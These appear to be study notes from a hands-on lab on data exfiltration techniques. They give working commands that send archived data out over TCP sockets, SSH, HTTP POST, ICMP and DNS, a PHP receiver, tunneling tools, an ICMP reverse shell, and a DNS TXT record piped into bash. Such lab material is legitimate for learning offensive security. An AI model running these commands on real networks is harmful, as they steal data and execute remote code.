## Data Exfiltration

##### What is Data Exfiltration

Data exfiltration is moving a sensitive data from inside the organization's network to the outside, it is also used to hide malicious activity and bypass security products.

##### How to Use Data Exfiltration

Traditional data exfiltration: Using one or more network requests to transfer data from the organization out.

C2 communications: The attacker sends a request to execute a command in the victim's machine, in result the data passes to the attacker over standard or non-traditional protocol.

Tunneling: The attacker establishes a communication channel that acts as abridge, resulting in a continuous traffic sent and received.

## Exfiltration Using TCP Socket

Since we relay on non-standard protocols with this technique, it's only recommended to use it in a non-secure environments.

We will also use other techniques like data encoding and archiving.

`nc -lvp <port> > <file location>` - Receive data to a file.
`tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/<ip address>/<port>` - Transfer the file to your machine.

1. We used the tar command to create an archive file.
2. We created a base64 representation of the tar file.
3. We created and copied a backup file using EBCDIC encoding data.
4. We transfored the file to the TCP socket we created.

`dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar` - Convert the received data back to his original status.
`tar xvf task4-creds.tar` - Unarchive the file.

## Exfiltration Using SSH

We can use the `scp` command or use the SSH client to transfer data over SSH.

For using a client the attacker need to control a server.

`tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` - Archive the data and transfer it using SSH.

1. Create an archive file.
2. We than passed the archived file over SSH.
3. We passed the command to be executed.

## Exfiltrate Using HTTP(S)

For this technique the attacker will needs control over a web server with a server-side programming language installed and enabled.

##### HTTP POST Request

Using HTTP makes it hard to distinguish between the attacker's traffic and a regular one, some of the benefits of using POST requests are:

- Never cached
- do not remain in the browser history
- cannot be bookmarked
- have no restrictions on data lengths

An attacker can control a web server somewhere in the cloud, than an agent or command is executed from a compromised machine to send data over the internet, the attacker than logs in to the web server to get the data.

##### HTTP Data Exfiltration

Steps to exfiltrate data:

1. Set a web server with data handler, for example site.com with contact.php page as data handler.
2. A C2 agent or an attacker sends the data, for example with curl.
3. The web server receives the data and stores it.
4. The attacker logs in to the web server to receive a copy of the received data.

PHP code to handle POST request and save the data to the /tmp directory:

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

`curl --data "file=$(tar zcf - task6 | base64)" <web page>` - Use the `curl` command and the `--data` argument to create a POST request via the `file` parameter.

`sudo sed -i 's/ /+/g' /tmp/http.bs64` - On the attacker machine fix the broken base64.
`cat /tmp/http.bs64 | base64 -d | tar xvfz -` - Extract the file.

##### HTTPS Communication

With HTTPS we transmit all the data with SSL keys stored on a server.

##### HTTP Tunneling

This tunneling techniques encapsulates other protocols and sends them back and forth via the HTTP protocol, with this technique we can pivot between web servers on the network.

[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) is a tool to establish communication channel to access the internal network devices.

`python3 neoreg.py generate -k thm` - Generate an encrypted client file to upload it to the victim web server with thm key.

Now you will need to upload a tunnel PHP file to the target web server.

`python3 neoreg.py -k thm -u http://10.10.220.229/uploader/files/tunnel.php` - Connect to the client and provide a key to decrypt the tunneling client, with the URL to the file we uploaded.

`curl --socks5 127.0.0.1:1080 http://<internal server's ip address>:80` - Use the tunnel to connect to the wanted server.

## Exfiltration Using ICMP

##### ICMP Data Section

ICMP includes data section that is a copy of other information, like the IPv4 header, it can also be empty or filled with random data which is the case with the `ping` command.

![[38e7df5e059ece4c2567bd7f77421b22.png]]

In Linux OS we can use the `-p` argument with the `ping` command to specify 16 bytes of data in hex.

`echo "<data>" | xxd -p` - Convert the data you want to exfiltrate to hex.

##### ICMP Data Exfiltration

The Metasploit framework will use the same technique by capturing incoming ICMP packets and waiting for a Beginning of File (BOF) trigger value, once received it writes to the disk until it gets End of File (EOF) trigger values.

![[b45715c44b5998fa9bf6a989b1e0d8d6.png]]

`use auxiliary/server/icmp_exfil` - A module to capture and listen for ICMP traffic.
`set BPF_FILTER icmp and not src <ip address>` - Capture only ICMP packets, ignoring the ones that come from the attacking machine.

`sudo nping --icmp -c 1 <attacker ip> --data-string "BOFfile.txt"` - Use nping to send BOF from the target machine, BOFfile is the default waiting value in Metasploit.
`sudo nping --icmp -c 1 <attacker ip> --data-string "<data>"` - Start sending the data you want, you can repeat this step.
`sudo nping --icmp -c 1 <attacker ip> --data-string "EOF"` - Send EOF.

##### ICMP C2 Communication

ICMPDoor is an open source reverse shell, an attacker sends a command that needs to be executed on the victim machine, once executed the victim sends the output with the ICMP packet in the data section.

`sudo icmpdoor -i <interface> -d <Server's side ip>` - Execute this from the victim machine.
`sudo icmp-cnc -i <interface> -d <destenation ip address>` - Establish a communication channel from the attacker machine.

You now should be able to run commands.

## DNS Configurations

For DNS exfiltration you need to control a domain name and set up DNS records.

We need to configure name server as the following:

- A record that point to the attacker's IP.
- NS record that routs DNS queries to the A records (full domain name).

## Exfiltration Over DNS

##### What is DNS Data Exfiltration?

DNS isn't usually monitored because it's not a data transfer protocol, making it a good target for attackers.

Some limitations:

- The max length of the FQDN is 255 characters.
- The subdomain name (label) must not exceed 63 characters.

![[8bbc858294e45de16712024af22181fc.png]]

For this reason a large files will require a lot of DNS packets, which will make a lot of noise and can be easily detected.

DNS exfiltration steps:

1. An attacker registers a domain name, for example, **tunnel.com** 
2. The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
3. The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where **passw0rd** is the data that needs to be transferred.
4. The DNS request is sent through the local DNS server and is forwarded through the Internet.
5. The attacker's authoritative DNS (malicious server) receives the DNS request.
6. Finally, the attacker extracts the password from the domain name.

##### When do we Need to use the DNS Data Exfiltration

In many cases for example if the firewall allows DNS traffic and blocks other traffic.

##### DNS Data Exfiltration

You need to encode the data and send it as discussed.

`sudo tcpdump -i eth0 udp port 53 -v ` - Capture the network traffic for DNS requests.
`cat <file> | base64` - From the target machine make a base64 representation of the data in the file you want to exfiltrate.
`cat <file> | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'` - Split the data to multiple requests, based on the size.
or
`cat <file> |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/` - Split every 18 characters with a dot in a single request.
`cat file |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash` - Send the DNS request.

##### C2 Communications over DNS

C2 frameworks use DNS for sending command execution request and receiving the result, they also use the TXT record to run a dropper.

You can add a base64 representation of a script you want to execute as TXT record to a domain you control.

`dig +short -t TXT <TXT record>` - Confirm the presents of the TXT record on the domain.
`dig +short -t TXT <TXT record> | tr -d "\"" | base64 -d | bash` - Execute the script from the target machine.

## DNS Tunneling

##### DNS Tunneling (TCPoverDNS)

In this technique an attacker encapsulates other protocols like HTTP over DNS using the DNS Data Exfiltration technique, which establishes a continuous communication channel.

The steps for DNS tunneling:

1. Create a new NS record that points to your machine.
2. Run iodined server from you machine.
3. Run a iodined client from a machine with access to the service you want.
4. SSH to the machine on the created network interface to create a proxy over DNS.
5. Now we can use the local IP and port as a proxy.

`sudo iodined -f -c -P <password> 10.1.1.1/24 <name server>` - Create the server.
`sudo iodine -P <password> <name server>` - Connect to the server side application.
`ssh thm@10.1.1.2 -4 -f -N -D 1080` - Start SSH connection in the background to the pivot machine.
`proxychains curl http://192.168.0.100/demo.php` or `curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php` - Get the data which goes over the DNS protocol.